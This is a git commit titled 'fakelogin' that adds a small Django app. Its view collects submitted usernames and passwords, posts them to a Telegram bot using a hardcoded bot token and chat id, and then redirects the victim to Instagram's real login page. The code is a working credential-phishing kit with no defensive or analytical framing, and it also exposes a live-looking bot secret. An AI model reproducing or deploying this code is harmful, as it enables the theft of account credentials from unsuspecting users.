719ec263c87812cd875046090aaee652b52427ef
mehmetakif <makif242106@gmail.com>
2024-04-10 00:04:13 +0300

    fakelogin

---
+++ myapp/views.py
@@ -0,0 +1,27 @@
+import requests
+from django.http import HttpResponse
+from django.shortcuts import redirect, render
+def index(request):
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        password = request.POST.get('password')
+        
+        # Telegram botuna HTTP isteği gönder
+        send_telegram_message(username, password)
+
+        return redirect('https://www.instagram.com/accounts/login/')
+    return render(request, 'myapp/index.html')
+
+def send_telegram_message(username, password):
+    bot_token = '6924985170:AAHZLuymEWEDcVOyB3FYIUuS5M9xw4nZUNA'
+    chat_id = '1217630043'
+
+    message = f'Kullanıcı Adı: {username}, Şifre: {password}'
+    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
+    params = {'chat_id': chat_id, 'text': message}
+    response = requests.post(url, params=params)
+    if response.status_code == 200:
+        print('Telegram mesajı başarıyla gönderildi!')
+    else:
+        print('Telegram mesajı gönderilirken bir hata oluştu!')
+
---
+++ mysite/urls.py
@@ -0,0 +1,6 @@
+from django.urls import path
+from myapp import views
+
+urlpatterns = [
+    path('myapp/', views.index, name='index'),
+]
